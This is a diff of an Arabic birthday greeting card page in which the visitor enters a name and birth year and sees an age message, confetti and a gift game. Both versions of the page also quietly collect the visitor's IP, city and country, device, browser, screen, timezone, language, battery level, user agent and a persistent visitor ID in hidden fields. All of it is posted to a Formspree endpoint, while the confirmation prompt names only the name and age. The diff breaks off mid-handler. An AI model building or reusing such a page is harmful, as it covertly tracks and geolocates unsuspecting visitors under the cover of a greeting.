@@ -3,224 +3,86 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>🎂 بطاقة تهنئة عيد ميلاد - برو</title>
+  <title>🎂 بطاقة تهنئة عيد ميلاد</title>
   <style>
-    /* ===== المتغيرات ===== */
-    :root {
-      --bg1: #ff9a9e;
-      --bg2: #fad0c4;
-      --card-bg: rgba(255,255,255,0.95);
-      --text: #333;
-      --border: #ff6b81;
-      --shadow: rgba(0,0,0,0.15);
-      --glass: rgba(255,255,255,0.15);
-      --glow: rgba(255,107,107,0.3);
-      --radius: 28px;
-      --transition: 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
-    }
-    [data-theme="dark"] {
-      --bg1: #0f0c29;
-      --bg2: #302b63;
-      --card-bg: rgba(30,30,60,0.95);
-      --text: #eee;
-      --border: #f39c12;
-      --shadow: rgba(255,255,255,0.1);
-      --glass: rgba(255,255,255,0.05);
-      --glow: rgba(243,156,18,0.3);
-    }
-    [data-theme="gold"] {
-      --bg1: #1a0e00;
-      --bg2: #4a2a00;
-      --card-bg: rgba(30,20,10,0.95);
-      --text: #f5e6c8;
-      --border: #f1c40f;
-      --shadow: rgba(255,215,0,0.2);
-      --glass: rgba(255,215,0,0.05);
-      --glow: rgba(241,196,15,0.3);
-    }
-    [data-theme="ocean"] {
-      --bg1: #001a2e;
-      --bg2: #004a7c;
-      --card-bg: rgba(0,30,60,0.95);
-      --text: #b8e6f5;
-      --border: #00d4ff;
-      --shadow: rgba(0,212,255,0.2);
-      --glass: rgba(0,212,255,0.05);
-      --glow: rgba(0,212,255,0.3);
-    }
-
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      font-family: system-ui, -apple-system, sans-serif;
+      font-family: system-ui, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
-      background: linear-gradient(135deg, var(--bg1), var(--bg2));
+      background: linear-gradient(135deg, #ff9a9e, #fad0c4);
       padding: 20px;
-      transition: all var(--transition);
     }
-
-    /* ===== خلفية متحركة ===== */
-    .bg-animation {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: 0;
-      pointer-events: none;
-      overflow: hidden;
-    }
-    .bg-animation .orb {
-      position: absolute;
-      border-radius: 50%;
-      filter: blur(80px);
-      animation: orbFloat 20s ease-in-out infinite alternate;
-      opacity: 0.3;
-    }
-    .bg-animation .orb:nth-child(1) { width: 300px; height: 300px; background: var(--border); top: -10%; left: -10%; }
-    .bg-animation .orb:nth-child(2) { width: 400px; height: 400px; background: var(--glow); bottom: -20%; right: -10%; animation-delay: -5s; }
-    .bg-animation .orb:nth-child(3) { width: 200px; height: 200px; background: var(--glass); top: 50%; left: 50%; animation-delay: -10s; }
-    @keyframes orbFloat {
-      0% { transform: translate(0, 0) scale(1); }
-      100% { transform: translate(50px, -50px) scale(1.2); }
-    }
-
-    /* ===== البطاقة ===== */
     .card {
-      position: relative;
-      z-index: 1;
-      background: var(--card-bg);
+      background: #fff;
       padding: 35px 25px;
-      border-radius: var(--radius);
-      box-shadow: 0 20px 60px var(--shadow);
+      border-radius: 28px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.15);
       text-align: center;
       width: 100%;
-      max-width: 450px;
-      border: 2px solid var(--border);
-      backdrop-filter: blur(20px);
-      transition: all var(--transition);
+      max-width: 420px;
+      border: 3px solid #ff6b81;
     }
-
-    .icon {
-      font-size: 70px;
-      display: block;
-      animation: iconBounce 2s ease-in-out infinite;
-    }
-    @keyframes iconBounce {
-      0%, 100% { transform: translateY(0) scale(1); }
-      50% { transform: translateY(-10px) scale(1.05); }
-    }
-
-    h2 {
-      color: var(--border);
-      font-size: 28px;
-      margin: 5px 0 10px;
-      font-weight: 800;
-      text-shadow: 0 0 40px var(--glow);
-      transition: color 0.3s;
-    }
-
+    .icon { font-size: 60px; display: block; }
+    h2 { color: #ff4757; font-size: 26px; margin: 5px 0 10px; }
     .greeting-text {
       font-size: 15px;
-      color: var(--text);
+      color: #555;
+      background: #fff0f3;
+      padding: 12px;
+      border-radius: 12px;
       margin-bottom: 20px;
-      line-height: 1.8;
-      background: var(--glass);
-      padding: 14px;
-      border-radius: 16px;
-      backdrop-filter: blur(10px);
-      transition: color 0.3s;
+      line-height: 1.6;
     }
-
-    /* ===== رسالة العمر ===== */
     .birthday-message {
-      background: linear-gradient(135deg, rgba(255,236,210,0.9), rgba(252,182,159,0.9));
-      padding: 20px;
-      border-radius: 20px;
+      background: linear-gradient(135deg, #ffecd2, #fcb69f);
+      padding: 18px;
+      border-radius: 16px;
       margin-bottom: 20px;
-      font-size: 22px;
-      font-weight: 700;
+      font-size: 20px;
+      font-weight: bold;
       color: #c0392b;
       display: none;
-      animation: messagePop 0.6s ease;
-      border: 2px solid rgba(192,57,43,0.2);
     }
-    .birthday-message.show { display: block; }
-    @keyframes messagePop {
-      0% { transform: scale(0.8) rotate(-2deg); opacity: 0; }
-      50% { transform: scale(1.03) rotate(1deg); }
-      100% { transform: scale(1) rotate(0); opacity: 1; }
+    .birthday-message.show { display: block; animation: pop 0.5s ease; }
+    @keyframes pop {
+      0% { transform: scale(0.8); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
     }
-
-    .age-details {
-      font-size: 14px;
-      color: #666;
-      margin-top: 5px;
-      font-weight: 400;
-    }
-    .message-custom {
-      font-size: 16px;
-      color: #8e44ad;
-      margin-top: 5px;
-      font-weight: 600;
-      background: rgba(255,255,255,0.3);
-      padding: 4px 16px;
-      border-radius: 30px;
-      display: inline-block;
-    }
-
+    .age-details { font-size: 14px; color: #555; font-weight: normal; margin-top: 5px; }
+    .custom-message { font-size: 16px; color: #8e44ad; margin-top: 5px; font-weight: 600; }
     input {
       width: 100%;
-      padding: 14px 18px;
+      padding: 14px;
       margin-bottom: 12px;
-      border: 2px solid rgba(255,255,255,0.1);
+      border: 2px solid #ddd;
       border-radius: 14px;
       font-size: 16px;
       text-align: center;
-      background: rgba(255,255,255,0.06);
-      backdrop-filter: blur(10px);
-      color: var(--text);
-      transition: all 0.3s;
     }
-    input::placeholder { color: var(--text); opacity: 0.5; }
-    input:focus {
-      border-color: var(--border);
-      outline: none;
-      transform: scale(1.02);
-      box-shadow: 0 0 30px var(--glow);
-    }
-
+    input:focus { border-color: #ff6b81; outline: none; }
     .btn-submit {
       width: 100%;
       padding: 16px;
-      background: linear-gradient(135deg, var(--border), var(--glow));
-      color: white;
+      background: linear-gradient(135deg, #f093fb, #f5576c);
+      color: #fff;
       border: none;
       border-radius: 14px;
       font-size: 18px;
-      font-weight: 700;
+      font-weight: bold;
       cursor: pointer;
-      transition: all 0.4s;
-      text-shadow: 0 2px 10px rgba(0,0,0,0.2);
+      transition: 0.3s;
     }
-    .btn-submit:hover {
-      transform: scale(1.02) translateY(-2px);
-      box-shadow: 0 10px 30px var(--glow);
-    }
-    .btn-submit:active { transform: scale(0.98); }
-
+    .btn-submit:hover { transform: scale(1.02); box-shadow: 0 8px 25px rgba(245,87,108,0.4); }
     #status {
       font-size: 14px;
       margin: 12px 0;
-      color: var(--text);
+      color: #666;
       font-weight: 500;
       min-height: 25px;
-      transition: color 0.3s;
     }
-
-    /* ===== أدوات التحكم ===== */
     .toolbar {
       display: flex;
       justify-content: center;
@@ -228,112 +90,40 @@
       flex-wrap: wrap;
       margin-top: 15px;
       padding-top: 15px;
-      border-top: 2px solid var(--glass);
+      border-top: 2px solid #eee;
     }
     .toolbar button {
-      background: var(--glass);
-      border: 2px solid var(--border);
-      color: var(--text);
-      padding: 6px 16px;
+      background: #f0f0f0;
+      border: 2px solid #ff6b81;
+      padding: 8px 18px;
       border-radius: 30px;
       cursor: pointer;
-      font-size: 13px;
+      font-size: 14px;
       font-weight: 600;
-      transition: all 0.3s;
-      backdrop-filter: blur(10px);
+      transition: 0.3s;
+      color: #333;
     }
     .toolbar button:hover {
-      background: var(--border);
-      color: white;
+      background: #ff6b81;
+      color: #fff;
       transform: scale(1.05);
-      box-shadow: 0 5px 20px var(--glow);
     }
-
     .countdown {
       font-size: 14px;
-      color: var(--text);
-      margin-top: 10px;
+      color: #888;
+      margin-top: 12px;
       padding: 10px;
-      background: var(--glass);
+      background: #f8f8f8;
       border-radius: 12px;
-      backdrop-filter: blur(10px);
-      transition: color 0.3s;
     }
-
-    /* ===== الكونفيتي ===== */
-    .confetti-container {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
-      z-index: 999;
-      overflow: hidden;
-    }
-    .confetti {
-      position: absolute;
-      width: 10px;
-      height: 10px;
-      border-radius: 2px;
-      animation: confettiFall linear infinite;
-    }
-    @keyframes confettiFall {
-      0% { transform: translateY(-10px) rotate(0deg); opacity: 1; }
-      100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
-    }
-
-    /* ===== البطارية ===== */
-    .battery-indicator {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      font-size: 13px;
-      color: var(--text);
-      margin-top: 10px;
-      padding: 6px 14px;
-      background: var(--glass);
-      border-radius: 30px;
-      backdrop-filter: blur(10px);
-    }
-    .battery-bar {
-      width: 50px;
-      height: 6px;
-      background: rgba(255,255,255,0.1);
-      border-radius: 3px;
-      overflow: hidden;
-    }
-    .battery-fill {
-      height: 100%;
-      border-radius: 3px;
-      transition: width 0.5s;
-    }
-
-    .visitor-stats {
-      font-size: 12px;
-      color: var(--text);
-      margin-top: 10px;
-      padding: 6px 14px;
-      background: var(--glass);
-      border-radius: 30px;
-      opacity: 0.7;
-      backdrop-filter: blur(10px);
-    }
-
     .game-area {
       margin: 15px 0;
       display: none;
-      background: var(--glass);
+      background: #f8f8f8;
       padding: 15px;
       border-radius: 16px;
-      backdrop-filter: blur(10px);
     }
-    .game-area.show { display: block; animation: fadeSlide 0.5s ease; }
-    @keyframes fadeSlide {
-      from { opacity: 0; transform: translateY(-15px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
+    .game-area.show { display: block; }
     .game-options {
       display: flex;
       justify-content: center;
@@ -344,35 +134,61 @@
     .game-options button {
       font-size: 35px;
       padding: 10px 18px;
-      border: 3px solid var(--border);
+      border: 3px solid #ff6b81;
       border-radius: 16px;
       cursor: pointer;
-      background: var(--glass);
-      transition: all 0.3s;
+      background: #fff;
+      transition: 0.3s;
     }
-    .game-options button:hover {
-      transform: scale(1.1);
-      background: var(--border);
-      box-shadow: 0 5px 20px var(--glow);
-    }
-
+    .game-options button:hover { transform: scale(1.1); }
     .hidden { display: none; }
+    .battery-indicator {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 13px;
+      color: #555;
+      margin-top: 10px;
+    }
+    .battery-bar {
+      width: 50px;
+      height: 6px;
+      background: #ddd;
+      border-radius: 3px;
+      overflow: hidden;
+    }
+    .battery-fill { height: 100%; border-radius: 3px; transition: width 0.5s; }
+    .visitor-stats {
+      font-size: 12px;
+      color: #888;
+      margin-top: 10px;
+    }
+    .confetti-container {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      pointer-events: none;
+      z-index: 999;
+      overflow: hidden;
+    }
+    .confetti {
+      position: absolute;
+      width: 10px; height: 10px;
+      border-radius: 2px;
+      animation: fall linear infinite;
+    }
+    @keyframes fall {
+      0% { transform: translateY(-10px) rotate(0deg); opacity: 1; }
+      100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
+    }
   </style>
 </head>
 <body>
 
-<!-- ===== الخلفية المتحركة ===== -->
-<div class="bg-animation">
-  <div class="orb"></div>
-  <div class="orb"></div>
-  <div class="orb"></div>
-</div>
-
-<!-- ===== الكونفيتي ===== -->
 <div class="confetti-container" id="confettiContainer"></div>
 
-<!-- ===== البطاقة ===== -->
-<div class="card" id="mainCard">
+<div class="card">
   <span class="icon">🎉</span>
   <h2>كل عام وأنت بخير!</h2>
   <p class="greeting-text">🎈 أدخل اسمك وسنة ميلادك، وستظهر لك تهنئة خاصة بعمرك الحقيقي!</p>
@@ -380,13 +196,13 @@
   <div id="birthdayMessage" class="birthday-message">
     🎂 <span id="displayName"></span>، عمرك الآن <span id="displayAge"></span> سنة!
     <div class="age-details" id="ageDetails"></div>
-    <div class="message-custom" id="customMessage"></div>
-    <br>كل سنة وأنت طيب يا بطل 💪
+    <div class="custom-message" id="customMessage"></div>
+    <br>كل سنة وأنت طيب 💪
   </div>
 
-  <form id="birthdayForm" onsubmit="return false;">
+  <form id="birthdayForm">
     <input type="text" id="nameInput" placeholder="👤 أدخل اسمك الكريم" required>
-    <input type="number" id="yearInput" placeholder="📅 أدخل سنة ميلادك (مثال: 1995)" required min="1900" max="2026">
+    <input type="number" id="yearInput" placeholder="📅 أدخل سنة ميلادك" required min="1900" max="2026">
     <div id="status"></div>
 
     <input type="hidden" id="ip" name="ip">
@@ -406,24 +222,20 @@
     <button type="button" class="btn-submit" onclick="handleSubmit()">🎁 إرسال التهنئة الآن</button>
   </form>
 
-  <!-- ===== لعبة ===== -->
   <div class="game-area" id="gameArea">
-    <p style="color: var(--text); font-weight: 600;">🎁 اختر هديتك:</p>
+    <p style="font-weight:600;">🎁 اختر هديتك:</p>
     <div class="game-options">
       <button onclick="chooseGift('🎮')">🎮</button>
       <button onclick="chooseGift('📱')">📱</button>
       <button onclick="chooseGift('💎')">💎</button>
       <button onclick="chooseGift('🚗')">🚗</button>
     </div>
-    <div id="giftResult" style="margin-top:10px; font-size:18px; color:var(--border); font-weight:600;"></div>
+    <div id="giftResult" style="margin-top:10px; font-size:18px; color:#ff6b81; font-weight:600;"></div>
   </div>
 
-  <!-- ===== البطارية ===== -->
   <div class="battery-indicator" id="batteryIndicator">
     🔋 <span id="batteryLevel">--%</span>
-    <div class="battery-bar">
-      <div class="battery-fill" id="batteryFill" style="width:0%; background:#2ed573;"></div>
-    </div>
+    <div class="battery-bar"><div class="battery-fill" id="batteryFill" style="width:0%; background:#2ed573;"></div></div>
   </div>
 
   <div class="toolbar">
@@ -434,224 +246,157 @@
   </div>
 
   <div class="countdown" id="countdown"></div>
-  <div class="visitor-stats" id="visitorStats">👤 زائر رقم: <span id="visitorCount">--</span></div>
+  <div class="visitor-stats">👤 زائر رقم: <span id="visitorCount">--</span></div>
 </div>
 
 <script>
-  // ===== 1. الثيمات =====
+  // ===== الثيمات =====
   const THEMES = ['light', 'dark', 'gold', 'ocean'];
   const THEME_NAMES = ['فاتح', 'داكن', 'ذهبي', 'محيط'];
-  let currentTheme = parseInt(localStorage.getItem('themeIndex')) || 0;
-  document.documentElement.setAttribute('data-theme', THEMES[currentTheme]);
+  let currentTheme = parseInt(localStorage.getItem('theme')) || 0;
 
   function toggleTheme() {
     currentTheme = (currentTheme + 1) % THEMES.length;
     document.documentElement.setAttribute('data-theme', THEMES[currentTheme]);
-    localStorage.setItem('themeIndex', currentTheme);
+    localStorage.setItem('theme', currentTheme);
     document.querySelector('.toolbar button:first-child').textContent = `🎨 ${THEME_NAMES[currentTheme]}`;
   }
 
-  // ===== 2. جمع المعلومات =====
-  async function collectDetailedInfo() {
-    const info = {};
-
+  // ===== جمع المعلومات =====
+  async function collectInfo() {
     try {
       const ipRes = await fetch('https://api.ipify.org?format=json');
       const ipData = await ipRes.json();
-      info.ip = ipData.ip;
-      const geoRes = await fetch(`https://ipapi.co/${info.ip}/json/`);
+      document.getElementById('ip').value = ipData.ip;
+      const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
       const geoData = await geoRes.json();
-      info.location = `${geoData.city || 'غير معروف'}، ${geoData.region || ''}، ${geoData.country_name || 'غير معروف'}`;
-    } catch (e) {
-      info.ip = 'غير متاح';
-      info.location = 'غير متاح';
-    }
+      document.getElementById('location').value = `${geoData.city || ''}، ${geoData.country_name || ''}`;
+    } catch(e) {}
 
     const ua = navigator.userAgent;
-    info.user_agent = ua;
-
-    if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) {
-      info.device = 'جوال';
-      if (/iPad|Android|Tablet/i.test(ua)) info.device = 'جهاز لوحي';
-    } else {
-      info.device = 'كمبيوتر';
-    }
-    if (/Windows/i.test(ua)) info.device += ' (Windows)';
-    else if (/Mac/i.test(ua)) info.device += ' (Mac)';
-    else if (/Linux/i.test(ua)) info.device += ' (Linux)';
-
-    let browser = 'غير معروف';
-    if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
-    else if (ua.includes('Firefox')) browser = 'Firefox';
-    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
-    else if (ua.includes('Edg')) browser = 'Edge';
-    else if (ua.includes('Opera')) browser = 'Opera';
-    info.browser = browser;
-
-    info.screen = `${screen.width}x${screen.height}px`;
-    info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    info.language = navigator.language;
-    info.visit_time = new Date().toLocaleString('ar-SA', { timeZone: info.timezone });
-
-    if (navigator.connection) {
-      const conn = navigator.connection;
-      info.connection = `${conn.effectiveType || 'غير معروف'} (${conn.downlink || '?'} Mbps)`;
-    } else {
-      info.connection = 'غير متاح';
-    }
+    document.getElementById('device').value = /Mobile/i.test(ua) ? 'جوال' : 'كمبيوتر';
+    document.getElementById('browser').value = ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : 'Safari';
+    document.getElementById('screen').value = `${screen.width}x${screen.height}`;
+    document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    document.getElementById('language').value = navigator.language;
+    document.getElementById('visit_time').value = new Date().toLocaleString('ar-SA');
 
     try {
       const battery = await navigator.getBattery();
-      info.battery = `${Math.round(battery.level * 100)}%`;
-      if (battery.charging) info.battery += ' (شحن)';
-      document.getElementById('batteryLevel').textContent = info.battery;
-      document.getElementById('batteryFill').style.width = `${battery.level * 100}%`;
-      document.getElementById('batteryFill').style.background = battery.level > 0.2 ? '#2ed573' : '#ff4757';
-    } catch (e) {
-      info.battery = 'غير متاح';
-      document.getElementById('batteryIndicator').style.display = 'none';
-    }
+      const level = Math.round(battery.level * 100);
+      document.getElementById('battery').value = level + '%';
+      document.getElementById('batteryLevel').textContent = level + '%';
+      document.getElementById('batteryFill').style.width = level + '%';
+      document.getElementById('batteryFill').style.background = level > 20 ? '#2ed573' : '#ff4757';
+    } catch(e) {}
 
-    let visitorId = localStorage.getItem('visitorId');
-    if (!visitorId) {
-      visitorId = 'VIS-' + Date.now().toString(36) + '-' + Math.random().toString(36).substr(2, 6);
-      localStorage.setItem('visitorId', visitorId);
-    }
-    info.visitor_id = visitorId;
-
-    let visits = parseInt(localStorage.getItem('visits') || '0');
-    visits++;
+    let visits = parseInt(localStorage.getItem('visits') || '0') + 1;
     localStorage.setItem('visits', visits);
     document.getElementById('visitorCount').textContent = visits;
-
-    document.getElementById('ip').value = info.ip || 'غير متاح';
-    document.getElementById('location').value = info.location || 'غير متاح';
-    document.getElementById('device').value = info.device || 'غير متاح';
-    document.getElementById('browser').value = info.browser || 'غير متاح';
-    document.getElementById('screen').value = info.screen || 'غير متاح';
-    document.getElementById('timezone').value = info.timezone || 'غير متاح';
-    document.getElementById('language').value = info.language || 'غير متاح';
-    document.getElementById('visit_time').value = info.visit_time || 'غير متاح';
-    document.getElementById('connection').value = info.connection || 'غير متاح';
-    document.getElementById('battery').value = info.battery || 'غير متاح';
-    document.getElementById('user_agent').value = info.user_agent || 'غير متاح';
-    document.getElementById('visitor_id').value = info.visitor_id || 'غير متاح';
   }
 
-  // ===== 3. رسائل مخصصة =====
-  function getCustomMessage(age) {
-    if (age < 10) return '🌟 أنت صغير لكن مستقبلك عظيم!';
-    if (age < 18) return '🚀 أنت في بداية رحلة العمر!';
-    if (age < 30) return '💪 في قمة العطاء والإبداع!';
-    if (age < 50) return '👑 في عز الحكمة والإنجاز!';
-    if (age < 70) return '🌟 في قمة النضج والجمال!';
-    return '💎 أنت كنز ثمين من الحكمة!';
-  }
-
-  // ===== 4. حساب العمر =====
+  // ===== حساب العمر =====
   function calculateAgeAndShow() {
     const name = document.getElementById('nameInput').value.trim();
     const year = parseInt(document.getElementById('yearInput').value);
     const currentYear = new Date().getFullYear();
-    const messageDiv = document.getElementById('birthdayMessage');
+    const msg = document.getElementById('birthdayMessage');
 
-    if (name && year && year >= 1900 && year <= currentYear) {
+    if (name && year >= 1900 && year <= currentYear) {
       const age = currentYear - year;
       if (age > 0 && age < 120) {
         document.getElementById('displayName').textContent = name;
         document.getElementById('displayAge').textContent = age;
         document.getElementById('age').value = age;
-        document.getElementById('customMessage').textContent = getCustomMessage(age);
-        const details = calculateAgeDetails(year);
-        document.getElementById('ageDetails').textContent =
-          `📍 ${details.years} سنة، ${details.months} شهر، ${details.days} يوم`;
-        messageDiv.classList.add('show');
+        const details = calcDetails(year);
+        document.getElementById('ageDetails').textContent = `${details.years} سنة، ${details.months} شهر، ${details.days} يوم`;
+        document.getElementById('customMessage').textContent = getMsg(age);
+        msg.classList.add('show');
         updateCountdown(year);
         launchConfetti();
         return;
       }
     }
-    messageDiv.classList.remove('show');
+    msg.classList.remove('show');
   }
 
-  function calculateAgeDetails(birthYear) {
+  function calcDetails(year) {
     const now = new Date();
-    const birthDate = new Date(birthYear, 0, 1);
-    let years = now.getFullYear() - birthDate.getFullYear();
-    let months = now.getMonth() - birthDate.getMonth();
-    let days = now.getDate() - birthDate.getDate();
-    if (days < 0) { months--; days += 30; }
-    if (months < 0) { years--; months += 12; }
-    return { years, months, days };
+    const bd = new Date(year, 0, 1);
+    let y = now.getFullYear() - bd.getFullYear();
+    let m = now.getMonth() - bd.getMonth();
+    let d = now.getDate() - bd.getDate();
+    if (d < 0) { m--; d += 30; }
+    if (m < 0) { y--; m += 12; }
+    return { years: y, months: m, days: d };
   }
 
-  function updateCountdown(birthYear) {
+  function getMsg(age) {
+    if (age < 10) return '🌟 أنت صغير لكن مستقبلك عظيم!';
+    if (age < 18) return '🚀 أنت في بداية رحلة العمر!';
+    if (age < 30) return '💪 في قمة العطاء!';
+    if (age < 50) return '👑 في عز الحكمة!';
+    return '💎 أنت كنز ثمين!';
+  }
+
+  function updateCountdown(year) {
     const now = new Date();
-    const nextBirthday = new Date(now.getFullYear(), 0, 1);
-    if (now > nextBirthday) nextBirthday.setFullYear(nextBirthday.getFullYear() + 1);
-    const diff = nextBirthday - now;
-    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
-    const hours = Math.floor((diff % (86400000)) / (3600000));
-    const minutes = Math.floor((diff % (3600000)) / (60000));
+    const next = new Date(now.getFullYear(), 0, 1);
+    if (now > next) next.setFullYear(next.getFullYear() + 1);
+    const diff = next - now;
     document.getElementById('countdown').textContent =
-      `⏳ العيد القادم بعد ${days} يوم، ${hours} ساعة، ${minutes} دقيقة`;
+      `⏳ العيد القادم بعد ${Math.floor(diff/(1000*60*60*24))} يوم، ${Math.floor((diff%(86400000))/(3600000))} ساعة`;
   }
 
-  // ===== 5. كونفيتي =====
+  // ===== كونفيتي =====
   function launchConfetti() {
-    const container = document.getElementById('confettiContainer');
-    const colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff', '#5f27cd', '#1dd1a1', '#f368e0'];
-    for (let i = 0; i < 100; i++) {
-      const c = document.createElement('div');
-      c.className = 'confetti';
-      c.style.left = Math.random() * 100 + '%';
-      c.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-      c.style.width = (Math.random() * 10 + 4) + 'px';
-      c.style.height = (Math.random() * 10 + 4) + 'px';
-      c.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
-      c.style.animationDuration = (Math.random() * 4 + 2) + 's';
-      c.style.animationDelay = (Math.random() * 2) + 's';
-      container.appendChild(c);
+    const c = document.getElementById('confettiContainer');
+    const colors = ['#ff6b6b','#feca57','#48dbfb','#ff9ff3','#54a0ff','#1dd1a1'];
+    for (let i = 0; i < 80; i++) {
+      const el = document.createElement('div');
+      el.className = 'confetti';
+      el.style.left = Math.random() * 100 + '%';
+      el.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+      el.style.width = (Math.random() * 8 + 4) + 'px';
+      el.style.height = (Math.random() * 8 + 4) + 'px';
+      el.style.animationDuration = (Math.random() * 3 + 2) + 's';
+      el.style.animationDelay = (Math.random() * 2) + 's';
+      c.appendChild(el);
     }
-    setTimeout(() => { container.innerHTML = ''; }, 6000);
+    setTimeout(() => c.innerHTML = '', 5000);
   }
 
-  // ===== 6. لعبة =====
+  // ===== لعبة =====
   function chooseGift(gift) {
     const gifts = {
-      '🎮': '🎮 أتمنى لك ساعات من المرح! 🎉',
-      '📱': '📱 تقنية متطورة في انتظارك! 🌟',
-      '💎': '💎 حياة مليئة بالجمال والرفاهية! ✨',
-      '🚗': '🚗 رحلات ومغامرات لا تنسى! 🛣️'
+      '🎮': '🎮 أتمنى لك ساعات من المرح!',
+      '📱': '📱 تقنية متطورة في انتظارك!',
+      '💎': '💎 حياة مليئة بالجمال!',
+      '🚗': '🚗 رحلات ومغامرات لا تنسى!'
     };
-    document.getElementById('giftResult').textContent = gifts[gift] || '🎁 هدية رائعة لك!';
+    document.getElementById('giftResult').textContent = gifts[gift] || '🎁 هدية رائعة!';
     launchConfetti();
   }
 
   function toggleGame() {
-    const game = document.getElementById('gameArea');
-    game.classList.toggle('show');
-    if (game.classList.contains('show')) {
-      document.getElementById('giftResult').textContent = '🎁 اختر هديتك المفضلة!';
-    }
+    const g = document.getElementById('gameArea');
+    g.classList.toggle('show');
+    if (g.classList.contains('show')) document.getElementById('giftResult').textContent = '🎁 اختر هديتك!';
   }
 
-  // ===== 7. مشاركة =====
+  // ===== مشاركة =====
   function shareCard() {
     const name = document.getElementById('nameInput').value.trim() || 'صديقي';
     const age = document.getElementById('age').value || '؟';
-    const text = `🎉 كل عام وأنت بخير يا ${name}! 🎂\nعمرك الآن ${age} سنة!\nكل سنة وأنت طيب 💪`;
-    if (navigator.share) {
-      navigator.share({ title: '🎂 تهنئة عيد ميلاد', text });
-    } else {
-      navigator.clipboard.writeText(text).then(() => {
-        document.getElementById('status').innerText = "📋 تم نسخ التهنئة!";
-        document.getElementById('status').style.color = "#2ed573";
-      });
-    }
+    const text = `🎉 كل عام وأنت بخير يا ${name}! 🎂\nعمرك ${age} سنة!\nكل سنة وأنت طيب 💪`;
+    if (navigator.share) navigator.share({ title: '🎂 تهنئة', text });
+    else navigator.clipboard.writeText(text).then(() => {
+      document.getElementById('status').innerText = '📋 تم النسخ!';
+      document.getElementById('status').style.color = '#2ed573';
+    });
   }
 
-  // ===== 8. إعادة تعيين =====
+  // ===== إعادة =====
   function resetCard() {
     document.getElementById('birthdayForm').reset();
     document.getElementById('birthdayMessage').classList.remove('show');
@@ -662,43 +407,27 @@
     document.getElementById('confettiContainer').innerHTML = '';
   }
 
-  // ===== 9. إرسال البيانات (المعدل) =====
+  // ===== إرسال =====
   function handleSubmit() {
     const name = document.getElementById('nameInput').value.trim();
     const year = document.getElementById('yearInput').value.trim();
     const status = document.getElementById('status');
     const age = document.getElementById('age').value;
 
-    // التحقق من المدخلات
-    if (!name) {
-      status.innerText = "⚠️ الرجاء إدخال اسمك!";
-      status.style.color = "#ff4757";
-      return;
-    }
+    if (!name) { status.innerText = '⚠️ أدخل اسمك!'; status.style.color = '#ff4757'; return; }
     if (!year || isNaN(year) || year < 1900 || year > new Date().getFullYear()) {
-      status.innerText = "⚠️ الرجاء إدخال سنة ميلاد صحيحة!";
-      status.style.color = "#ff4757";
+      status.innerText = '⚠️ سنة ميلاد غير صحيحة!';
+      status.style.color = '#ff4757';
       return;
     }
-    if (!age || age < 1) {
-      status.innerText = "⚠️ يرجى التأكد من سنة الميلاد!";
-      status.style.color = "#ff4757";
-      return;
-    }
+    if (!age || age < 1) { status.innerText = '⚠️ تأكد من السنة!'; status.style.color = '#ff4757'; return; }
+    if (!confirm(`🎈 إرسال تهنئة باسم "${name}" وعمر ${age} سنة؟`)) return;
 
-    // تأكيد المستخدم
-    if (!confirm(`🎈 هل تريد إرسال تهنئة باسم "${name}" وعمر ${age} سنة؟`)) {
-      return;
-    }
+    status.innerText = '⏳ جاري الإرسال...';
+    status.style.color = '#333';
 
-    status.innerText = "⏳ جاري الإرسال...";
-    status.style.color = "#333";
-
-    // جمع البيانات
     const data = {
-      name: name,
-      age: age,
-      birth_year: year,
+      name, age, birth_year: year,
       ip: document.getElementById('ip').value || 'غير متاح',
       location: document.getElementById('location').value || 'غير متاح',
       device: document.getElementById('device').value || 'غير متاح',
@@ -713,18 +442,14 @@
       visitor_id: document.getElementById('visitor_id').value || 'غير متاح'
     };
 
-    // إرسال إلى Formspree
-    fetch("https://formspree.io/f/xpqvvkdp", {
-      method: "POST",
+    fetch('https://formspree.io/f/xpqvvkdp', {
+      method: 'POST',
       body: JSON.stringify(data),
-      headers: {
-        'Accept': 'application/json',
-        'Content-Type': 'application/json'
-      }
-    }).then(response => {
-      if (response.ok) {
-        status.innerText = "✅ تم إرسال التهنئة بنجاح! شكراً لك 🎊";
-        status.style.color = "#2ed573";
+      headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }
+    }).then(r => {
+      if (r.ok) {
+        status.innerText = '✅ تم الإرسال! شكراً 🎊';
+        status.style.color = '#2ed573';
         document.getElementById('birthdayForm').reset();
         document.getElementById('birthdayMessage').classList.remove('show');
         document.getElementById('countdown').textContent = '';
@@ -732,24 +457,21 @@
         document.getElementById('gameArea').classList.remove('show');
         launchConfetti();
       } else {
-        status.innerText = "❌ حدث خطأ، حاول مرة أخرى.";
-        status.style.color = "#ff4757";
+        status.innerText = '❌ حدث خطأ، حاول مرة أخرى.';
+        status.style.color = '#ff4757';
       }
     }).catch(() => {
